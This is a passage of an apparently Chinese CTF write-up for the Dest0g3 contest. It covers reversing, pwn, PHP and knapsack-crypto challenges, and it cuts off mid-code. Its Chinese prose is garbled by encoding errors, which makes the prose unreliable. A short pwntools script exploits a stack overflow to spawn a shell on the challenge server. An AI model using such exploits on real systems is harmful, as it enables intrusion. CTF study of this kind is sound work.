class="hljs-number">0</span>xc6    <span class="hljs-number">0</span>x1c    <span class="hljs-number">0</span>x7a    <span class="hljs-number">0</span>x8e    <span class="hljs-number">0</span>x9f<br><span class="hljs-attribute">0x7fffffffdf18</span>: <span class="hljs-number">0</span>x46    <span class="hljs-number">0</span>xbd    <span class="hljs-number">0</span>x60    <span class="hljs-number">0</span>xe7    <span class="hljs-number">0</span>x82    <span class="hljs-number">0</span>xf3    <span class="hljs-number">0</span>xee    <span class="hljs-number">0</span>x69<br><span class="hljs-attribute">0x7fffffffdf20</span>: <span class="hljs-number">0</span>x49    <span class="hljs-number">0</span>xf7    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe3    <span class="hljs-number">0</span>xe2    <span class="hljs-number">0</span>x17    <span class="hljs-number">0</span>xc0    <span class="hljs-number">0</span>xb9<br><span class="hljs-attribute">0x7fffffffdf28</span>: <span class="hljs-number">0</span>x2c    <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>x30    <span class="hljs-number">0</span>xa4    <span class="hljs-number">0</span>x48    <span class="hljs-number">0</span>x01    <span class="hljs-number">0</span>x41    <span class="hljs-number">0</span>x98<br><span class="hljs-attribute">0x7fffffffdf30</span>: <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>xa9    <span class="hljs-number">0</span>xb5    <span class="hljs-number">0</span>xe5    <span class="hljs-number">0</span>x11    <span class="hljs-number">0</span>x74    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe8<br><span class="hljs-attribute">0x7fffffffdf38</span>: <span class="hljs-number">0</span>xac    <span class="hljs-number">0</span>xfd    <span class="hljs-number">0</span>x8b    <span class="hljs-number">0</span>xa5    <span class="hljs-number">0</span>x6d <br></code></pre></td></tr></table></figure><p>xç›´æ¥å°±åœ¨æ–‡ä»¶é‡Œé¢ï¼Œç›´æ¥æ‰¾å‡ºæ¥å°±è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªBYTEè½¬æ¢ï¼Œå®é™…ä¸Šv1æ˜¯intç±»å‹çš„ï¼Œè¿™å°±ä¸¢æ•°æ®äº†ã€‚æˆ‘ä»¬é€†å‘è¿‡ç¨‹ä¸å¤ªèƒ½è§£ã€‚ç”±äºè¿™ä¸ªé¢˜ç›®æ•°æ®å‰åæ²¡æœ‰å…³è”æ€§ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨çˆ†ç ´çš„æ–¹å¼ï¼Œå¤æ‚åº¦ä¸ºO(n)ï¼Œæ˜¯å¯ä»¥çˆ†ç ´çš„ï¼Œä¹Ÿå°±å­—ç¬¦é›†*45çš„å¤§å°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br><span class="hljs-type">char</span> x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>,<br>            <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>,<br>            <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0x20</span>; i &lt;= <span class="hljs-number">0x7e</span>; i++) &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span>*i;<br>            <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (BYTE)v1 + x[index] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) == enc[index] )&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index ++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3f82cd79-da3-04-aa0a5b3e445c&#125;</span><br></code></pre></td></tr></table></figure><p>å…¶å®é‚£ä¸ªå·¦ç§»31+24ä½å¯ä»¥ç›´æ¥å»æ‰äº†ï¼Œunsigned intä¹Ÿæ˜¯4å­—èŠ‚çš„ï¼Œ4å­—èŠ‚ä¸€å…±æ‰32ä½ï¼Œæ‰€ä»¥å‰é¢å’Œåé¢çš„é‚£ä¸¤ä¸ªä½ç§»å°±æ˜¯0ï¼Œå¯ä»¥å»æ‰ã€‚</p><p>å—¯â€¦ä½†æ˜¯è·‘å‡ºæ¥çš„ç»“æœå¥½åƒä¸å¤ªå¯¹ï¼Œå°‘äº†ä¸€éƒ¨åˆ†çš„æ•°æ®ã€‚çœ‹èµ·æ¥æ˜¯æ•°æ®ç±»å‹çš„é—®é¢˜ã€‚ä¸»è¦æ˜¯è¿™ä¸ªcharä»–çš„æ­£è´Ÿæœ‰ç‚¹éš¾æã€‚æœ€åç»Ÿä¸€äº†ä¸€ä¸‹åˆ¤æ–­çš„æ ¼å¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br>BYTE x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>,<br>            <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>,<br>            <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>,<br>            <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0x0</span>; i &lt;= <span class="hljs-number">0xff</span>; i++)<br>        &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span> * i;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>)((BYTE)v1 + x[index]) == (<span class="hljs-type">char</span>)(enc[index]))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;</span><br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="ez_arrch"><a class="markdownIt-Anchor" href="#ez_arrch"></a> ez_arrch</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_968</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [xsp+10h] [xbp+10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please leave your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, you can exploit it now.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åæ±‡ç¼–èƒ½çœ‹åˆ°è¿™ä¸ªå‡½æ•°ï¼Œè¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºã€‚æ¥ä¸‹æ¥å°±æ˜¯çœ‹çœ‹ç”¨ä»€ä¹ˆæº¢å‡ºçš„æ–¹å¼äº†ã€‚</p><p>ç¿»äºŒè¿›åˆ¶æ•°æ®çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªâ€œ/bin/shâ€çš„å­—ç¬¦ä¸²ï¼ŒåŠ ä¸Šç¨‹åºæä¾›äº†systemè¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æƒ³é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥è¿›è¡Œæº¢å‡ºã€‚</p><p>å½“æˆ‘è·Ÿéšè¿™ä¸ªå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå‘ç°ä»–æ˜¯åœ¨å¦å¤–ä¸€ä¸ªå‡½æ•°é‡Œé¢çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">000000000000093</span>C ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000000093</span>C ; __unwind &#123;<br>.text:<span class="hljs-number">000000000000093</span>C                 STP             X29, X30, [SP,#<span class="hljs-number">-0x10</span>]!<br>.text:<span class="hljs-number">0000000000000940</span>                 MOV             X29, SP<br>.text:<span class="hljs-number">0000000000000944</span>                 ADRL            X0, aOkYouGetIt ; <span class="hljs-string">&quot;OK, you get it !&quot;</span><br>.text:<span class="hljs-number">000000000000094</span>C                 BL              .<span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000000950</span>                 ADRL            X0, aBinSh ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">0000000000000958</span>                 BL              .system<br>.text:<span class="hljs-number">000000000000095</span>C                 NOP<br>.text:<span class="hljs-number">0000000000000960</span>                 LDP             X29, X30, [SP],#<span class="hljs-number">0x10</span><br>.text:<span class="hljs-number">0000000000000964</span>                 RET<br>.text:<span class="hljs-number">0000000000000964</span> ; &#125; <span class="hljs-comment">// starts at 93C</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è·³è¿™ä¸ªå‡½æ•°å°±è¡Œäº†ï¼Œä¸éœ€è¦å†ç”¨system+å‚æ•°äº†ã€‚è€Œä¸”æˆ‘çœ‹äº†çœ‹systemçš„åœ°å€å¥½åƒä¹ŸæŒºå¥‡æ€ªçš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28099</span>)<br>func_addr = <span class="hljs-number">0x4000000000</span> + <span class="hljs-number">0x93c</span><br>r.send(pwn.p64(func_addr)*<span class="hljs-number">10</span>)<br>r.interactive()<br><br><span class="hljs-comment"># Dest0g3&#123;e5df9fec-e7cb-4f27-9c49-62f1d260395d&#125;</span><br></code></pre></td></tr></table></figure><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h2><p>è¿™é¢˜ç½‘ä¸Šç›´æ¥æœ‰è§£ï¼Œç”±äºæˆ‘æœ¬èº«å¯¹Webä¸å¤ªç†Ÿæ‚‰ï¼Œè¿™é‡Œæˆ‘åªæ˜¯è¿æ°”å¥½ç¢°ä¸Šäº†ã€‚</p><p>è¿™é‡Œç»™å‡ºåœ°å€ï¼š</p><p><a href="https://blog.csdn.net/fmyyy1/article/details/117256082">https://blog.csdn.net/fmyyy1/article/details/117256082</a></p><h2 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$dest0g3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-variable">$timme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable">$timmme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>);<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$time</span> &gt; <span class="hljs-string">&quot;24&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timme</span> &gt; <span class="hljs-string">&quot;31&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timmme</span> &gt; <span class="hljs-string">&quot;60&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fl4g</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try harder!&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    function() <span class="hljs-keyword">use</span>(&amp;$<span class="hljs-title">fl4g</span>) &#123;<br>        <span class="hljs-title">print</span> $<span class="hljs-title">fl4g</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$fl4g</span> .= <span class="hljs-variable">$dest0g3</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯è¦æ¥è§¦å‘è¿™ä¸ªset_error_handlerï¼Œæ‰€ä»¥ä¸Šä¼ ä¸€ä¸ªè¯­æ³•é”™è¯¯å°±è¡Œäº†ã€‚è¿™é‡Œä¼ çš„æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;aa4f0051<span class="hljs-string">-414</span>d<span class="hljs-string">-46</span>bf-ab12<span class="hljs-string">-599</span>c5596c8e4&#125;<br></code></pre></td></tr></table></figure><h1 id="æœªå®Œæˆ"><a class="markdownIt-Anchor" href="#æœªå®Œæˆ"></a> æœªå®Œæˆ</h1><h2 id="bag"><a class="markdownIt-Anchor" href="#bag"></a> Bag</h2><p>ç”±äºæºç¨‹åºä¸­çš„æ•°æ®å äº†å¾ˆå¤§ä¸€éƒ¨åˆ†ï¼Œè¿™é‡Œçš„ä»£ç æˆ‘è‡ªå·±è¿›è¡Œäº†ä¿®æ”¹ï¼ŒæŠŠæ•°æ®é‡‡ç”¨ç”Ÿæˆçš„æ–¹å¼æ¥è¡¨ç¤ºäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>message = bytes_to_long(flag[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>])<br>Baglenth=<span class="hljs-number">286</span><br><span class="hljs-comment"># ä¸‹é¢çš„ä»£ç ç»è¿‡äº†ä¿®æ”¹</span><br>Bag=[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(Bag) &lt;= Baglenth:<br>    Bag.append(Bag[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>)<br><br>Bag=Bag[::-<span class="hljs-number">1</span>]<br>m=<span class="hljs-number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span><br>w=<span class="hljs-number">274062421102700155372289583695782343443</span><br><span class="hljs-keyword">assert</span> gmpy2.gcd(m,w)==<span class="hljs-number">1</span><br>h=<span class="hljs-number">0</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> m.bit_length()%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>)<br><span class="hljs-keyword">else</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">m,lenth</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(m)&lt;lenth:<br>        m=<span class="hljs-string">&#x27;0&#x27;</span>+m<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>():<br>    pk=[]<br>    sk=[]<br>    sk.append(m)<br>    sk.append(<span class="hljs-built_in">int</span>(gmpy2.invert(w,m)))<br>    D=[]<br>    binD=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        di=(w*Bag[i])%m<br>        D.append(di)<br>        bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>        bindi=pad(bindi,h)<br>        binD.append(bindi)<br>    U=[]<br>    V=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        tempu=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][:j]),<span class="hljs-number">2</span>)<br>        U.append(tempu)<br>        tempv=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][j:]),<span class="hljs-number">2</span>)<br>        V.append(tempv)<br>    e=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(V))+<span class="hljs-number">2</span><br>    f=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(U))<br>    <span class="hljs-keyword">assert</span> gmpy2.gcd(e,f)==<span class="hljs-number">1</span><br>    sk.append(<span class="hljs-built_in">int</span>(e))<br>    sk.append(<span class="hljs-built_in">int</span>(f))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        